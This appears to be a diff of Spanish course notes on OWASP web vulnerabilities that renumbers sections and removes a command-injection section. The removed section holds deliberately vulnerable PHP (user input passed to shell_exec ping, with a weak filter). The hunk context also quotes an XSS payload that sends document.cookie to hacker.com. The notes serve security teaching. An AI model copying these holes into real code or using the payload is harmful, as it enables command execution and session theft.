@@ -31,24 +31,26 @@
     - **Facilidad de detección**
     - **Impacto** técnico sobre la empresa u organización
 
-#### Listado (2013)
+### Listado de vulnerabilidades (a estudiar)
 
 - Inyección
-- Ejecución maliciosa de ficheros
-- XSS
-- Mala autenticación y gestión de sesiones
+- XSS (Cross Site Scripting)
+- Ejecución de código (Command Injection)
+- Ejecución maliciosa de ficheros (LFI/RFI)
+- Mala autenticación y gestión de sesiones (Session Hijacking)
 - Referencia directa insegura a objetos
-- CSRF
+- CSRF (Cross Site Request Forgery)
 - Configuraciones Inseguras
 - URL mal restringidas
 - Redirecciones y reenvíos
+- Subida de archivos sin restricción
 - Almacenamiento criptográfico inseguro
 - Protección insuficiente en la capa de transporte
 
 ## 3. Inyección :red_circle:
 
 - **Manipular las entradas** de una aplicación **para mandar comandos** a algún interprete para que los ejecute
-    - **SQL**, Shell del SO, LDAP, XPath, Hibernate, etc.
+    - **SQL**, **Shell** del SO, LDAP, XPath, Hibernate, etc.
 - **Falta de saneamiento de entradas**
 - **Sencillo de evitar**
 - Tiene un **impacto severo**
@@ -56,7 +58,7 @@
     - Acceso a SO
 - **Mitigación**:
     - Evitar utilizar un intérprete
-    - Escapar caracteres
+    - **Escapar caracteres**
     - Delimitar los valores de las consultas
     - **Verificar siempre los datos** que introduce el usuario
     - Asignar **mínimos privilegios**
@@ -279,62 +281,7 @@ window.open(http://hacker.com/info.pl?document.cookie)</script>
 ?>
 ```
 
-## 5. Ejecución de código (Command Injection)
-
-- Permite la ejecución de código remota "arbitraria"
-- Ejemplo: **Shellshock** ([CVE-2014-6271](<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271>))
-    - El bug se encuentra en Bash (< v4.3)
-    - Bash permite declarar funciones que no se validan de forma correcta cuando se almacenan en una variable
-    - Sigue ejecutando código a pesar de finalizar el procesamiento de la función
-
-### Command Execution
-
-#### Low
-
-```php
-<?php
-    if( isset( $_POST[ 'submit' ] ) ) {
-
-        $target = $_REQUEST[ 'ip' ];
-
-        if (stristr(php_uname('s'), 'Windows NT')) { 
-            $cmd = shell_exec( 'ping  ' . $target );
-            echo '<pre>'.$cmd.'</pre>';
-        } else { 
-            $cmd = shell_exec( 'ping  -c 3 ' . $target );
-            echo '<pre>'.$cmd.'</pre>';  
-        }
-    }
-?>
-```
-
-#### Medium
-
-```php
-<?php
-    if (isset($_POST[ 'submit'])) {
-
-        $target = $_REQUEST[ 'ip' ];
-
-        $substitutions = array(
-            '&&' => '',
-            ';' => '',
-        );
-
-        $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
-        
-        if (stristr(php_uname('s'), 'Windows NT')) { 
-            $cmd = shell_exec( 'ping  ' . $target );
-            echo '<pre>'.$cmd.'</pre>';
-        } else { 
-            $cmd = shell_exec( 'ping  -c 3 ' . $target );
-            echo '<pre>'.$cmd.'</pre>';  
-        }
-    }
-?>
-```
-
-## 6. Ejecución maliciosa de ficheros (LFI/RFI)
+## 5. Ejecución maliciosa de ficheros (LFI/RFI) :red_circle:
 
 - **No** está en el ranking top 10 de OWASP
 - *Dos tipos*:
@@ -371,7 +318,7 @@ window.open(http://hacker.com/info.pl?document.cookie)</script>
 ?>
 ```
 
-## 7. Mala autenticación y gestión de sesiones (Session Hijacking)
+## 6. Mala autenticación y gestión de sesiones (Session Hijacking)
 
 - Credenciales y tokens de sesión no bien protegidos
 - Los atacantes pueden obtener contraseñas, claves o tokens → Robo de sesión
@@ -394,9 +341,9 @@ window.open(http://hacker.com/info.pl?document.cookie)</script>
 - El robo de sesión (**Session Hijacking**) puede producirse cuando:
     - El ID de sesión **se puede adivinar, deducir u obtener**
     - Generalmente la ID de sesión del atacante suele tener los mismos privilegios que el usuario al que se usurpa la identidad
-    - útil cuando la sesión que se roba tiene privilegios
+    - Útil cuando la sesión que se roba tiene privilegios
     - Utilizado para escalar privilegios o iniciar nuevos vectores de ataque
-**Mitigación**:
+- **Mitigación**:
     - **ID** de sesión **compleja y ALEATORIA**
     - **Protección en la transmisión y almacenaje** de la ID de sesión
     - **No incluir** el identificador de la sesión **en la URL**:
@@ -420,7 +367,7 @@ window.open(http://hacker.com/info.pl?document.cookie)</script>
     - Proteger la comunicación
     - Informar a los usuarios sobre los riesgos y consecuencias de aceptar conexiones inseguras
 
-## 8. Referencia directa insegura a objetos
+## 7. Referencia directa insegura a objetos
 
 - Referencias a objetos implementados de manera interna
 - Los atacantes pueden manipular estas referencias para acceder a otros objetos sin autorización
@@ -438,7 +385,7 @@ window.open(http://hacker.com/info.pl?document.cookie)</script>
         - Verificar que el valor es correcto
         - **Verificar si el usuario tiene permiso** para acceder al objeto
 
-## 9. Cross Site Request Forgery (CSRF) :red_circle:
+## 8. Cross Site Request Forgery (CSRF) :red_circle:
 
 - **Forzar** a la víctima a:
     - **Realizar una petición** HTTP a una aplicación web vulnerable
@@ -521,7 +468,7 @@ window.open(http://hacker.com/info.pl?document.cookie)</script>
 ?>
 ```
 
-## 10. Configuraciones inseguras
+## 9. Configuraciones inseguras
 
 - De todo tipo:
     - En equipos de producción y de desarrollo
@@ -542,7 +489,7 @@ window.open(http://hacker.com/info.pl?document.cookie)</script>
     - Generar reportes para poder analizar posteriormente
     - Software de **análisis de vulnerabilidades**, configuración y parches
 
-## 11. URLs mal restringidas
+## 10. URLs mal restringidas
 
 - Relacionado con fallos en:
     - Gestión de autenticación
@@ -564,7 +511,7 @@ window.open(http://hacker.com/info.pl?document.cookie)</script>
 - Verificar que el **servidor deniega peticiones** a tipos de fichero no autorizados por defecto
 - Escaneos rutinarios
 
-## 12. Redirecciones y reenvíos
+## 11. Redirecciones y reenvíos
 
 - **Mala validación de los parámetros**
     - Páginas de Phishing, por ejemplo, una página de login falsa
@@ -584,7 +531,7 @@ window.open(http://hacker.com/info.pl?document.cookie)</script>
     - Validar la redirección mediante un filtro externo como Siteminder
     - Comprobar que el usuario tenga permisos para ver ambas páginas
 
-## 13. Subida de archivos sin restricción
+## 12. Subida de archivos sin restricción
 
 1. Conseguir **colar algún código en el sistema** a atacar
 2. Encontrar una manera de ejecutar ese código
@@ -656,7 +603,7 @@ window.open(http://hacker.com/info.pl?document.cookie)</script>
 ?>
 ```
 
-## 14. Almacenamiento Criptográfico Inseguro
+## 13. Almacenamiento Criptográfico Inseguro
 
 - Problemas relacionados con como se guarda la información
     - **No se guarda** la **información sensible cifrada**
@@ -682,7 +629,7 @@ window.open(http://hacker.com/info.pl?document.cookie)</script>
             - Cambios de clave
     - **Verificar la implementación**
 
-## 15. Protección insuficiente en la capa de transporte
+## 14. Protección insuficiente en la capa de transporte
 
 - **Transmitir datos importantes de manera segura**
     - Varios factores:
